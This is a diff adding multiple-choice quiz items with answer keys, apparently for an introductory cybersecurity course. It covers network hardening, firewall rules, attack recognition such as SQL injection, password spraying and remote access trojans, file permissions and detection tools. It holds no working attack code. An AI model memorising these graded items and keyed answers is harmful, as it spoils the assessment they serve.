+    "Correct. WEP is broken, and default credentials give anyone admin control.",
+    "Wrong. These are weaknesses, but much less severe.",
+    "Wrong. Old firmware matters, but a hidden SSID is minor.",
+    "Wrong. WPS is serious, but WEP and default admin access are worse."
+   ]
+  },
+  {
+   "id": "c3-05",
+   "u": 3,
+   "t": "3.2",
+   "s": "2.C",
+   "d": 2,
+   "st": "cs3b",
+   "q": "The owner thinks hiding the SSID makes the network secure. Why is that wrong?",
+   "c": [
+    "Hidden SSIDs can be discovered from client traffic, and they don't encrypt anything",
+    "Hidden SSIDs slow down Wi-Fi",
+    "Hidden SSIDs require WEP",
+    "Hidden SSIDs disable the firewall"
+   ],
+   "r": [
+    "Correct. Obscurity isn't a control; the real protection comes from encryption and authentication.",
+    "Wrong. Speed isn't the issue.",
+    "Wrong. Unrelated.",
+    "Wrong. Unrelated."
+   ]
+  },
+  {
+   "id": "c3-06",
+   "u": 3,
+   "t": "3.2",
+   "s": "2.B",
+   "d": 2,
+   "st": "cs3b",
+   "q": "Which set of changes BEST hardens this router?",
+   "c": [
+    "WPA3 with AES, WPS off, a unique admin password, updated firmware and lower transmit power",
+    "Keep WEP but make the key longer",
+    "Turn on MAC filtering only",
+    "Broadcast the SSID and keep everything else"
+   ],
+   "r": [
+    "Correct. Fixes every major weakness in layers.",
+    "Wrong. WEP is broken whatever the key length.",
+    "Wrong. MAC filtering is easy to bypass and leaves the other flaws.",
+    "Wrong. Changes nothing important."
+   ]
+  },
+  {
+   "id": "c3-07",
+   "u": 3,
+   "t": "3.3",
+   "s": "2.C",
+   "d": 2,
+   "st": "cs3c",
+   "q": "Why is the public website in the DMZ rather than the Servers zone?",
+   "c": [
+    "If the website is compromised, firewall rules still separate it from the student records database",
+    "The DMZ makes the website load faster",
+    "The DMZ encrypts web pages",
+    "Servers zones can't host websites"
+   ],
+   "r": [
+    "Correct. The DMZ contains a breach of internet-facing systems.",
+    "Wrong. Speed isn't the purpose.",
+    "Wrong. Zones don't encrypt.",
+    "Wrong. They could; it would just be riskier."
+   ]
+  },
+  {
+   "id": "c3-08",
+   "u": 3,
+   "t": "3.3",
+   "s": "1.C",
+   "d": 2,
+   "st": "cs3c",
+   "q": "A hallway camera is compromised. Based on the table, what can it reach?",
+   "c": [
+    "Only the camera recorder",
+    "The student records database",
+    "Every teacher laptop",
+    "The whole internet and all internal zones"
+   ],
+   "r": [
+    "Correct. The IoT VLAN is allowed to reach only the recorder, which contains the damage.",
+    "Wrong. The IoT zone has no path to Servers.",
+    "Wrong. There's no path to the Staff VLAN.",
+    "Wrong. Its access is limited to the recorder."
+   ]
+  },
+  {
+   "id": "c3-09",
+   "u": 3,
+   "t": "3.3",
+   "s": "2.A",
+   "d": 2,
+   "st": "cs3c",
+   "q": "Which principle does the Guest VLAN rule ('Internet only') apply?",
+   "c": [
+    "Least privilege",
+    "Separation of duties",
+    "Risk transfer",
+    "Security through obscurity"
+   ],
+   "r": [
+    "Correct. Guests get only the access they need.",
+    "Wrong. That splits tasks between people.",
+    "Wrong. Nothing is shifted to a third party.",
+    "Wrong. Nothing relies on being hidden."
+   ]
+  },
+  {
+   "id": "c3-10",
+   "u": 3,
+   "t": "3.4",
+   "s": "2.D",
+   "d": 2,
+   "st": "cs3d",
+   "q": "A request to TCP 443 arrives from 198.51.100.40. What happens?",
+   "c": [
+    "Allowed by Rule 1",
+    "Denied by Rule 3",
+    "Denied by the implicit deny",
+    "Allowed by Rule 4"
+   ],
+   "r": [
+    "Correct. Rule 1 matches first, so the deny in Rule 3 is never reached.",
+    "Wrong. Rule 3 is never checked for this packet.",
+    "Wrong. A rule matched before the implicit deny.",
+    "Wrong. Rule 4 is for port 3389."
+   ]
+  },
+  {
+   "id": "c3-11",
+   "u": 3,
+   "t": "3.4",
+   "s": "1.A",
+   "d": 2,
+   "st": "cs3d",
+   "q": "Which rule creates the GREATEST exposure?",
+   "c": [
+    "Rule 2, because it allows SSH from anywhere",
+    "Rule 1, because it allows HTTPS",
+    "Rule 3, because it denies a range",
+    "Rule 4, because it allows RDP from 10.0.5.0/24"
+   ],
+   "r": [
+    "Correct. Remote admin access from the whole internet invites brute-force and exploits.",
+    "Wrong. A web server is meant to accept HTTPS.",
+    "Wrong. A deny reduces exposure.",
+    "Wrong. It's limited to an internal subnet."
+   ]
+  },
+  {
+   "id": "c3-12",
+   "u": 3,
+   "t": "3.4",
+   "s": "2.D",
+   "d": 3,
+   "st": "cs3d",
+   "q": "The team wants 198.51.100.0/24 blocked from everything, and SSH allowed only from 10.0.5.0/24. Which change does BOTH?",
+   "c": [
+    "Move Rule 3 to the top, and change Rule 2's source to 10.0.5.0/24",
+    "Delete Rule 1",
+    "Move Rule 4 to the top",
+    "Add 'Allow TCP 22 from 10.0.5.0/24' at the bottom"
+   ],
+   "r": [
+    "Correct. The deny now matches first, and SSH is limited to the IT subnet.",
+    "Wrong. That blocks HTTPS for everyone and leaves SSH open.",
+    "Wrong. That changes nothing about the /24 or SSH.",
+    "Wrong. Rule 2 still allows SSH from ANY first."
+   ]
+  },
+  {
+   "id": "c3-13",
+   "u": 3,
+   "t": "3.5",
+   "s": "3.D",
+   "d": 2,
+   "st": "cs3e",
+   "q": "The 07:02 firewall entry is BEST described as:",
+   "c": [
+    "A port scan (reconnaissance)",
+    "A DDoS attack",
+    "A successful intrusion",
+    "A smurf attack"
+   ],
+   "r": [
+    "Correct. One source probing many ports in seconds is scanning.",
+    "Wrong. It's one source sending a handful of probes.",
+    "Wrong. Every attempt was denied.",
+    "Wrong. No ICMP flood is involved."
+   ]
+  },
+  {
+   "id": "c3-14",
+   "u": 3,
+   "t": "3.5",
+   "s": "3.B",
+   "d": 2,
+   "st": "cs3e",
+   "q": "Which detection method caught the 07:40 event, and which caught the 08:15 event?",
+   "c": [
+    "Signature at 07:40; anomaly at 08:15",
+    "Anomaly at 07:40; signature at 08:15",
+    "Both anomaly",
+    "Both signature"
+   ],
+   "r": [
+    "Correct. 07:40 matched a known exploit signature; 08:15 deviated from a 50/s baseline.",
+    "Wrong. The labels are reversed.",
+    "Wrong. 07:40 is explicitly a signature match.",
+    "Wrong. 08:15 is explicitly an anomaly."
+   ]
+  },
+  {
+   "id": "c3-15",
+   "u": 3,
+   "t": "3.5",
+   "s": "3.C",
+   "d": 3,
+   "st": "cs3e",
+   "q": "What does the 09:30 entry illustrate?",
+   "c": [
+    "A false negative: an attacker using valid credentials looked normal and wasn't flagged",
+    "A false positive",
+    "A true positive",
+    "A port scan"
+   ],
+   "r": [
+    "Correct. A real intrusion with no alert is a false negative; behavior that looks normal evades detection.",
+    "Wrong. No alert fired, so it can't be a false positive.",
+    "Wrong. It wasn't detected at the time.",
+    "Wrong. It was a VPN login."
+   ]
+  },
+  {
+   "id": "c4-01",
+   "u": 4,
+   "t": "4.1",
+   "s": "1.A",
+   "d": 2,
+   "st": "cs4a",
+   "q": "Based on 10:02-10:05, the downloaded program is BEST classified as a:",
+   "c": [
+    "Remote access trojan (RAT)",
+    "Worm",
+    "Logic bomb",
+    "Adware"
+   ],
+   "r": [
+    "Correct. It was disguised as a useful tool and then opened a channel for remote commands.",
+    "Wrong. It was installed by a user, though it later spreads.",
+    "Wrong. No trigger condition is described.",
+    "Wrong. It does far more than show ads."
+   ]
+  },
+  {
+   "id": "c4-02",
+   "u": 4,
+   "t": "4.1",
+   "s": "1.A",
+   "d": 2,
+   "st": "cs4a",
+   "q": "What capability does the Thursday 14:20 entry show?",
+   "c": [
+    "Keylogging",
+    "Ransomware encryption",
+    "Rootkit hiding",
+    "Denial of service"
+   ],
+   "r": [
+    "Correct. Recording keystrokes to a file is keylogging.",
+    "Wrong. Nothing was encrypted.",
+    "Wrong. This entry is about capturing typing, not hiding.",
+    "Wrong. No service was disrupted."
+   ]
+  },
+  {
+   "id": "c4-03",
+   "u": 4,
+   "t": "4.1",
+   "s": "1.B",
+   "d": 2,
+   "st": "cs4a",
+   "q": "The Friday 09:00 entry represents which attack phase?",
+   "c": [
+    "Lateral movement",
+    "Reconnaissance",
+    "Initial access",
+    "Exfiltration"
+   ],
+   "r": [
+    "Correct. Spreading from one PC to others inside the network.",
+    "Wrong. Reconnaissance comes before the attack.",
+    "Wrong. Initial access was on Monday.",
+    "Wrong. Copying itself is spreading, not sending data out."
+   ]
+  },
+  {
+   "id": "c4-04",
+   "u": 4,
+   "t": "4.2",
+   "s": "1.B",
+   "d": 2,
+   "st": "cs4b",
+   "q": "What can an attacker conclude about abaker and cdiaz from the leaked table?",
+   "c": [
+    "They use the same password, because their unsalted hashes are identical",
+    "Their usernames are encrypted",
+    "They both use MFA",
+    "Their passwords are long and unique"
+   ],
+   "r": [
+    "Correct. Without salt, identical passwords produce identical hashes.",
+    "Wrong. Usernames are plain text.",
+    "Wrong. The policy says no MFA.",
+    "Wrong. Identical hashes for common passwords suggest the opposite."
+   ]
+  },
+  {
+   "id": "c4-05",
+   "u": 4,
+   "t": "4.2",
+   "s": "1.C",
+   "d": 2,
+   "st": "cs4b",
+   "q": "Why are the hashes for abaker and bchen likely to be cracked almost instantly?",
+   "c": [
+    "Unsalted MD5 hashes of common passwords appear in precomputed rainbow tables",
+    "MD5 hashes can be decrypted with a key",
+    "The table is sorted",
+    "The usernames are short"
+   ],
+   "r": [
+    "Correct. Lookups in precomputed tables reverse common unsalted hashes.",
+    "Wrong. Hashes have no decryption key.",
+    "Wrong. Sorting doesn't matter.",
+    "Wrong. Username length doesn't matter."
+   ]
+  },
+  {
+   "id": "c4-06",
+   "u": 4,
+   "t": "4.2",
+   "s": "2.B",
+   "d": 3,
+   "st": "cs4b",
+   "q": "Which set of changes BEST fixes the problems shown?",
+   "c": [
+    "Use a modern salted hash, require at least 14 characters, enable lockout and MFA",
+    "Switch to SHA-1 and keep the other settings",
+    "Hide the leaked table",
+    "Require password changes every 30 days"
+   ],
+   "r": [
+    "Correct. Salted strong hashing protects stored passwords, while length, lockout and MFA protect logins.",
+    "Wrong. SHA-1 is deprecated, and nothing else improves.",
+    "Wrong. The data has already leaked.",
+    "Wrong. Frequent changes don't fix weak storage or the lack of MFA."
+   ]
+  },
+  {
+   "id": "c4-07",
+   "u": 4,
+   "t": "4.3",
+   "s": "1.C",
+   "d": 2,
+   "st": "cs4c",
+   "q": "Which laptop is at the HIGHEST risk, and why?",
+   "c": [
+    "T-02: unpatched critical flaws, firewall off and admin rights",
+    "T-01: signatures updated today",
+    "T-03: standard user",
+    "All three are equal"
+   ],
+   "r": [
+    "Correct. Known exploitable flaws, no host filtering and full privileges together.",
+    "Wrong. T-01 is well protected.",
+    "Wrong. T-03 has issues, but fewer than T-02.",
+    "Wrong. T-02 combines the most weaknesses."
+   ]
+  },
+  {
+   "id": "c4-08",
+   "u": 4,
+   "t": "4.3",
+   "s": "2.D",
+   "d": 2,
+   "st": "cs4c",
+   "q": "Which change fixes T-03's firewall problem?",
+   "c": [
+    "Change the inbound RDP rule to deny, or limit it to the IT subnet",
+    "Allow outbound ANY",
+    "Turn the firewall off",
+    "Allow inbound TCP 443 from ANY"
+   ],
+   "r": [
+    "Correct. RDP shouldn't be open to everyone.",
+    "Wrong. That doesn't address inbound RDP.",
+    "Wrong. That removes all filtering.",
+    "Wrong. That adds exposure."
+   ]
+  },
+  {
+   "id": "c4-09",
+   "u": 4,
+   "t": "4.3",
+   "s": "2.C",
+   "d": 2,
+   "st": "cs4c",
+   "q": "Why is T-03's anti-malware a concern even though the laptop is otherwise patched?",
+   "c": [
+    "Eight-month-old signatures won't recognize newer malware",
+    "Old signatures slow the processor",
+    "Signatures expire legally",
+    "Patching replaces anti-malware"
+   ],
+   "r": [
+    "Correct. Signature detection depends on current definitions.",
+    "Wrong. Performance isn't the concern.",
+    "Wrong. False.",
+    "Wrong. Patching and anti-malware cover different risks."
+   ]
+  },
+  {
+   "id": "c4-10",
+   "u": 4,
+   "t": "4.4",
+   "s": "3.D",
+   "d": 2,
+   "st": "cs4d",
+   "q": "Which attacks are shown in Cases 1 and 2, in order?",
+   "c": [
+    "Brute force, then password spraying",
+    "Password spraying, then brute force",
+    "Credential stuffing, then brute force",
+    "Brute force, then credential stuffing"
+   ],
+   "r": [
+    "Correct. Case 1 makes 312 tries on one account; Case 2 makes one try each on 1,200 accounts.",
+    "Wrong. Reversed.",
+    "Wrong. Case 1 targets a single account repeatedly.",
+    "Wrong. Case 2's pattern of one try per account from one source fits spraying with a common password."
+   ]
+  },
+  {
+   "id": "c4-11",
+   "u": 4,
+   "t": "4.4",
+   "s": "3.C",
+   "d": 3,
+   "st": "cs4d",
+   "q": "Why didn't lockout stop the success for nwong in Case 2?",
+   "c": [
+    "Spraying made only one attempt per account, staying under the lockout threshold",
+    "Lockout was off for nwong",
+    "The attacker used MFA",
+    "Lockout only applies to admins"
+   ],
+   "r": [
+    "Correct. Spraying is designed to avoid per-account lockout.",
+    "Wrong. Nothing in the log suggests that.",
+    "Wrong. The attacker had no MFA factor.",
+    "Wrong. Case 1 shows lockout applying, and nothing suggests it's limited to admins."
+   ]
+  },
+  {
+   "id": "c4-12",
+   "u": 4,
+   "t": "4.4",
+   "s": "3.D",
+   "d": 2,
+   "st": "cs4d",
+   "q": "Case 3 is BEST explained by:",
+   "c": [
+    "Stolen credentials used directly (for example from phishing or reuse), followed by data exfiltration",
+    "A brute-force attack",
+    "Password spraying",
+    "A normal remote login"
+   ],
+   "r": [
+    "Correct. A clean login at 3 a.m. from abroad, then a bulk download.",
+    "Wrong. There were no failures.",
+    "Wrong. Only one account is involved, with no failures.",
+    "Wrong. The time, the location and the 180-file download aren't normal."
+   ]
+  },
+  {
+   "id": "c5-01",
+   "u": 5,
+   "t": "5.1",
+   "s": "1.A",
+   "d": 2,
+   "st": "cs5a",
+   "q": "Which attack succeeds at 10:03?",
+   "c": [
+    "SQL injection",
+    "Cross-site scripting",
+    "Directory traversal",
+    "Buffer overflow"
+   ],
+   "r": [
+    "Correct. Input changed the query so it returned every row.",
+    "Wrong. No script runs in a browser here.",
+    "Wrong. No file path is involved.",
+    "Wrong. No memory corruption is involved."
+   ]
+  },
+  {
+   "id": "c5-02",
+   "u": 5,
+   "t": "5.1",
+   "s": "1.A",
+   "d": 2,
+   "st": "cs5a",
+   "q": "What are the 10:05 and 10:09 requests, in order?",
+   "c": [
+    "Directory traversal, then stored XSS",
+    "XSS, then SQL injection",
+    "SQL injection, then directory traversal",
+    "Buffer overflow, then XSS"
+   ],
+   "r": [
+    "Correct. ../ path sequences reach config.ini, and a saved script steals visitors' cookies.",
+    "Wrong. The first is a path attack.",
+    "Wrong. The second is a script injection.",
+    "Wrong. No memory attack is shown."
+   ]
+  },
+  {
+   "id": "c5-03",
+   "u": 5,
+   "t": "5.1",
+   "s": "1.B",
+   "d": 2,
+   "st": "cs5a",
+   "q": "How did the 10:02 response help the attacker?",
+   "c": [
+    "The SQL syntax error confirmed that input was placed directly into a query",
+    "It logged the attacker in",
+    "It deleted the database",
+    "It showed the server's password"
+   ],
+   "r": [
+    "Correct. The error revealed an injectable query.",
+    "Wrong. It returned an error, not a login.",
+    "Wrong. Nothing was deleted.",
+    "Wrong. Nothing in the log shows a password."
+   ]
+  },
+  {
+   "id": "c5-04",
+   "u": 5,
+   "t": "5.2",
+   "s": "2.D",
+   "d": 2,
+   "st": "cs5b",
+   "q": "Apart from build.sh, which files violate the policy because others can read them?",
+   "c": [
+    "design_notes.md and parts_list.csv",
+    "api_key.txt only",
+    "design_notes.md only",
+    "No other file violates it"
+   ],
+   "r": [
+    "Correct. Both end in r--, so others can read them, but the policy says nobody else may access project files.",
+    "Wrong. api_key.txt is 600: only the owner can read it.",
+    "Wrong. parts_list.csv (rw-rw-r--) also lets others read.",
+    "Wrong. Two more files are readable by others."
+   ]
+  },
+  {
+   "id": "c5-05",
+   "u": 5,
+   "t": "5.2",
+   "s": "2.D",
+   "d": 2,
+   "st": "cs5b",
+   "q": "Which command brings build.sh into compliance (owner can read, write and run; the group can read and run; others nothing)?",
+   "c": [
+    "chmod 750 build.sh",
+    "chmod 777 build.sh",
+    "chmod 755 build.sh",
+    "chmod 700 build.sh"
+   ],
+   "r": [
+    "Correct. rwx for the owner, r-x for the group, nothing for others.",
+    "Wrong. That's the current, non-compliant state.",
+    "Wrong. Others could still read and run it.",
+    "Wrong. The group couldn't read it."
+   ]
+  },
+  {
+   "id": "c5-06",
+   "u": 5,
+   "t": "5.2",
+   "s": "2.D",
+   "d": 3,
+   "st": "cs5b",
+   "q": "parts_list.csv should be readable by the group, writable only by the owner, and hidden from others. Which command does this?",
+   "c": [
+    "chmod 640 parts_list.csv",
+    "chmod 664 parts_list.csv",
+    "chmod 600 parts_list.csv",
+    "chmod g+w parts_list.csv"
+   ],
+   "r": [
+    "Correct. rw- for the owner, r-- for the group, --- for others.",
+    "Wrong. That's the current mode: the group can write and others can read.",
+    "Wrong. The group would lose read access.",
+    "Wrong. The group already has write, and others keep read."
+   ]
+  },
+  {
+   "id": "c5-07",
+   "u": 5,
+   "t": "5.4",
+   "s": "2.C",
+   "d": 2,
+   "st": "cs5c",
+   "q": "In step 3, why does the browser use asymmetric cryptography?",
+   "c": [
+    "To agree on a secret session key over an untrusted network without having shared one before",
+    "Because it is faster than AES for whole pages",
+    "To compress the pages",
+    "To hash the student's password"
+   ],
+   "r": [
+    "Correct. Asymmetric cryptography solves the key-distribution problem.",
+    "Wrong. It's slower; that's why AES takes over in step 4.",
+    "Wrong. Unrelated.",
+    "Wrong. Unrelated."
+   ]
+  },
+  {
+   "id": "c5-08",
+   "u": 5,
+   "t": "5.3",
+   "s": "2.C",
+   "d": 2,
+   "st": "cs5c",
+   "q": "Why does step 4 switch to AES?",
+   "c": [
+    "Symmetric encryption is much faster for large amounts of data",
+    "AES uses a public key",
+    "AES can't be broken by any method",
+    "Certificates require it"
+   ],
+   "r": [
+    "Correct. AES handles bulk data efficiently.",
+    "Wrong. AES is symmetric.",
+    "Wrong. Its strength depends on keeping the key secret.",
+    "Wrong. Certificates concern identity, not the bulk cipher."
+   ]
+  },
+  {
+   "id": "c5-09",
+   "u": 5,
+   "t": "5.4",
+   "s": "1.C",
+   "d": 3,
+   "st": "cs5c",
+   "q": "If step 5 failed and the portal's private key were stolen, what could an attacker do?",
+   "c": [
+    "Impersonate the portal to students and undermine the encrypted sessions",
+    "Only read the public certificate",
+    "Make the portal faster",
+    "Nothing, because the public key protects the site"
+   ],
+   "r": [
+    "Correct. The private key proves the portal's identity and protects key exchange.",
+    "Wrong. The certificate is already public.",
+    "Wrong. Unrelated.",
+    "Wrong. The private key is the secret that matters."
+   ]
+  },
+  {
+   "id": "c5-10",
+   "u": 5,
+   "t": "5.5",
+   "s": "2.A",
+   "d": 2,
+   "st": "cs5d",
+   "q": "Which fix MOST directly prevents the SQL injection risk in the notes?",
+   "c": [
+    "Use parameterized queries for search",
+    "Validate the name field only in the browser",
+    "Encode comments on display",
+    "Remove the debug page"
+   ],
+   "r": [
+    "Correct. Binding input as data stops it changing the SQL.",
+    "Wrong. Browser-only checks can be bypassed.",
+    "Wrong. That addresses XSS.",
+    "Wrong. Important, but not the injection fix."
+   ]
+  },
+  {
+   "id": "c5-11",
+   "u": 5,
+   "t": "5.5",
+   "s": "2.A",
+   "d": 2,
+   "st": "cs5d",
+   "q": "Which TWO notes describe failures of 'secure by default'?",
+   "c": [
+    "The debug page enabled in production and the admin/admin login",
+    "Browser-only validation and string-joined SQL",
+    "Raw comments and string-joined SQL",
+    "Full database rights and browser-only validation"
+   ],
+   "r": [
+    "Correct. Both are insecure out-of-the-box settings.",
+    "Wrong. These are coding flaws (validation and injection).",
+    "Wrong. These are coding flaws (XSS and injection).",
+    "Wrong. These are least privilege and validation issues."
+   ]
+  },
+  {
+   "id": "c5-12",
+   "u": 5,
+   "t": "5.5",
+   "s": "2.B",
+   "d": 3,
+   "st": "cs5d",
+   "q": "If SQL injection succeeded anyway, which note would MOST limit the damage once it's fixed?",
+   "c": [
+    "Reducing the database account to only the rights the app needs (least privilege)",
+    "Encoding comments on display",
+    "Moving validation into JavaScript",
+    "Renaming the debug page"
+   ],
+   "r": [
+    "Correct. A limited account can't drop tables or read unrelated data.",
+    "Wrong. That addresses XSS, not database damage.",
+    "Wrong. Validation should move to the server.",
+    "Wrong. Obscurity doesn't limit damage."
+   ]
+  },
+  {
+   "id": "c5-13",
+   "u": 5,
+   "t": "5.6",
+   "s": "3.D",
+   "d": 2,
+   "st": "cs5e",
+   "q": "What does the 02:00 FIM alert MOST likely mean?",
+   "c": [
+    "settings.conf was modified without authorization",
+    "The hash algorithm stopped working",
+    "The file was backed up",
+    "Normal nightly activity"
+   ],
+   "r": [
+    "Correct. The hash changed, and no approved change ticket exists.",
+    "Wrong. A mismatch means the content changed.",
+    "Wrong. Backups don't change a file's hash.",
+    "Wrong. No change was approved."
+   ]
+  },
+  {
+   "id": "c5-14",
+   "u": 5,
+   "t": "5.6",
+   "s": "3.A",
+   "d": 2,
+   "st": "cs5e",
+   "q": "Which tool stopped the 10:42 event, and what was it?",
+   "c": [
+    "DLP stopped attempted exfiltration of sensitive data",
+    "FIM stopped a configuration change",
+    "A honeypot caught a port scan",
+    "A firewall blocked a DDoS"
+   ],
+   "r": [
+    "Correct. DLP blocked an email carrying 2,800 SSNs to a personal address.",
+    "Wrong. FIM detects file changes; it didn't block this email.",
+    "Wrong. Honeypots are decoy systems.",
+    "Wrong. No flood is involved."
+   ]
+  },
+  {
+   "id": "c5-15",
+   "u": 5,
+   "t": "5.6",
+   "s": "3.C",
+   "d": 3,
+   "st": "cs5e",
+   "q": "Why is the 13:05 honeypot alert considered high-confidence?",
+   "c": [
+    "No legitimate user should ever touch the decoy, so any login attempt is suspicious",
+    "Honeypots block all attackers",
+    "Honeypots are on the guest network",
+    "The decoy holds real payroll data"
+   ],
+   "r": [
+    "Correct. Decoys have no normal users, so false positives are rare. An attempt from the staff VLAN points to an insider or lateral movement.",
+    "Wrong. Honeypots detect; they don't block.",
+    "Wrong. The attempt came from the staff VLAN.",
+    "Wrong. A decoy shouldn't hold real data."
+   ]
+  }
+ ]
+}
